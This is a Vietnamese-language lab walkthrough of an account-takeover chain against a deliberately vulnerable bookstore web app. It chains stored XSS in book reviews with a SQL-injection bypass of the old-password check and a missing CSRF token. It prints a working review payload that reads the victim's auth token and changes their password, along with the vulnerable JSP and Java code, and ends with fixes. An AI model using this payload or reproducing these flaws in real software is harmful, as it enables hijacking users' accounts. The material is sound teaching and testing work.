# Hướng Dẫn Tấn Công CSRF (Cross-Site Request Forgery)

## Tổng quan

Ứng dụng JVA Bookstore tồn tại lỗ hổng CSRF tại endpoint đổi mật khẩu:
- **Endpoint:** `POST /api/profile/password`
- **Lỗ hổng:** Không yêu cầu mật khẩu cũ, không kiểm tra CSRF token
- **Kết hợp:** Stored XSS trong phần đánh giá sách cho phép tấn công CSRF từ cùng origin

---

## Kịch bản tấn công: Stored XSS + CSRF

### Điều kiện tiên quyết
- Attacker có tài khoản trên hệ thống
- Attacker đã mua ít nhất 1 cuốn sách (để có quyền viết đánh giá)

### Bước 1: Attacker đăng nhập và mua sách

1. Đăng nhập bằng tài khoản attacker
2. Mua 1 cuốn sách bất kỳ (ví dụ sách có id=1)
3. Hoàn tất đơn hàng

### Bước 2: Attacker viết review chứa mã độc

Vào trang chi tiết cuốn sách đã mua, viết đánh giá với nội dung sau:

**Payload XSS (đổi mật khẩu nạn nhân):**

```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="var t=localStorage.getItem('auth_token');if(t){fetch('/api/profile/password',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({currentPassword:\"' OR '1'='1'--\",newPassword:'hacked_csrf',confirmPassword:'hacked_csrf'})})}">
```

**Giải thích payload:**
- Phần text đầu: nội dung đánh giá bình thường (>50 ký tự để pass validation)
- `<img src=x>`: tạo thẻ img với src không hợp lệ
- `onerror="..."`: khi img load lỗi → chạy JavaScript
- Script đọc `auth_token` từ localStorage → gửi request đổi mật khẩu
- `currentPassword` gửi payload SQLi: `' OR '1'='1'--` → bypass kiểm tra mật khẩu cũ
- Server kiểm tra BCrypt trước (thất bại) → fallback sang legacy SQL query với string concatenation → SQLi bypass thành công
- Mật khẩu mới: `hacked_csrf`

### Bước 3: Nạn nhân xem trang sách

1. Nạn nhân (đang đăng nhập) truy cập trang chi tiết cuốn sách
2. Trang load đánh giá → `${r.comment}` render trực tiếp không escape HTML
3. Thẻ `<img src=x>` được render → load lỗi → `onerror` chạy
4. JavaScript tự động gửi request đổi mật khẩu
5. **Mật khẩu nạn nhân bị đổi thành `hacked_csrf` mà không hay biết**

### Bước 4: Attacker chiếm tài khoản

1. Attacker login bằng email nạn nhân + mật khẩu `hacked_csrf`
2. Toàn quyền truy cập tài khoản nạn nhân

---

## Phân tích lỗ hổng

### Lỗ hổng 1: Stored XSS trong đánh giá sách

**File:** `src/main/webapp/book-detail.jsp` - dòng 265

```jsp
<p class="text-gray-700 leading-relaxed whitespace-pre-line break-words">
    ${r.comment}    <!-- KHÔNG ESCAPE HTML! -->
</p>
```

**Vấn đề:** Dùng `${r.comment}` (EL expression) thay vì `<c:out value="${r.comment}"/>`.
EL expression KHÔNG escape HTML → attacker chèn được thẻ HTML/JavaScript.

**Backend:** `ReviewDAO.upsertReview()` lưu content trực tiếp vào database mà không sanitize HTML.

### Lỗ hổng 2: SQL Injection trong kiểm tra mật khẩu cũ + CSRF

**File:** `src/main/java/web/ProfileServlet.java` - method `changePassword()`

```java
// BCrypt check trước (người dùng bình thường vẫn đổi mật khẩu được)
boolean passwordVerified = BCrypt.checkpw(currentPassword, storedHash);

// Fallback: legacy SQL query với string concatenation → SQLi!
if (!passwordVerified) {
    String legacySql = "SELECT id FROM users WHERE email = '" + email
                     + "' AND password_hash = '" + currentPassword + "'";
    // currentPassword = "' OR '1'='1'--" → bypass!
}
```

**Vấn đề:**
1. Legacy SQL fallback dùng string concatenation → SQL Injection
2. Attacker gửi `currentPassword = "' OR '1'='1'--"` → điều kiện luôn đúng → bypass xác minh
3. Không kiểm tra CSRF token
4. Kết hợp với Stored XSS → attacker gửi request từ cùng origin, bypass mọi bảo vệ

---

## Demo từng bước (có ảnh chụp)

### Bước 1: Login attacker → Viết review

Mở trình duyệt, đăng nhập tài khoản attacker, vào trang sách đã mua.

Trong ô "Nội dung đánh giá", paste payload:
```
Cuốn sách này thật sự rất hay và bổ ích, mình đã đọc xong trong 2 ngày. Rất recommend cho mọi người! <img src=x onerror="var t=localStorage.getItem('auth_token');if(t){fetch('/api/profile/password',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+t},body:JSON.stringify({currentPassword:\"' OR '1'='1'--\",newPassword:'hacked_csrf',confirmPassword:'hacked_csrf'})})}">
```

Nhấn "Gửi đánh giá" → Review được lưu vào database.

### Bước 2: Mở trình duyệt khác (hoặc tab ẩn danh) → Login nạn nhân

1. Đăng nhập bằng tài khoản nạn nhân
2. Truy cập trang chi tiết cuốn sách có review độc hại
3. Mở DevTools (F12) → Console → Thấy request POST đến `/api/profile/password`
4. Tab Network → Thấy response `{"success":true,"message":"Password changed successfully"}`

### Bước 3: Xác nhận tấn công thành công

1. Logout tài khoản nạn nhân
2. Thử login lại bằng mật khẩu cũ → **Thất bại**
3. Login bằng mật khẩu `hacked_csrf` → **Thành công**

---

## Kịch bản phụ: Trang phishing (csrf-phishing-demo.html)

Ngoài kịch bản XSS+CSRF, file `csrf-phishing-demo.html` demo tấn công CSRF qua trang phishing.

**Cách test:**
1. Login vào `https://localhost:8443`
2. Mở `https://localhost:8443/csrf-phishing-demo.html` (file đã copy vào webapp)
3. Nhấn "Xác Nhận Tài Khoản & Nhận Quà"
4. Form ẩn POST đến `/api/profile/password` → đổi mật khẩu

**Lưu ý:** Kịch bản này hoạt động vì trang phishing nằm trên cùng origin.
Trong thực tế, attacker cần kết hợp với lỗ hổng upload file hoặc XSS để đặt trang phishing lên server nạn nhân.

---

## Cách phòng chống

### Fix Stored XSS:
```jsp
<!-- TRƯỚC (lỗ hổng): -->
${r.comment}

<!-- SAU (an toàn): -->
<c:out value="${r.comment}"/>
```

### Fix SQL Injection trong password change:
```java
// Xóa legacy SQL fallback, chỉ dùng BCrypt:
if (!BCrypt.checkpw(currentPassword, storedHash)) {
    // Từ chối request — KHÔNG fallback sang SQL query
}
```

### Fix CSRF:
1. **Thêm CSRF token** vào mọi form/request state-changing
2. **Kiểm tra header Origin/Referer**
3. **Dùng SameSite=Strict** cho cookie
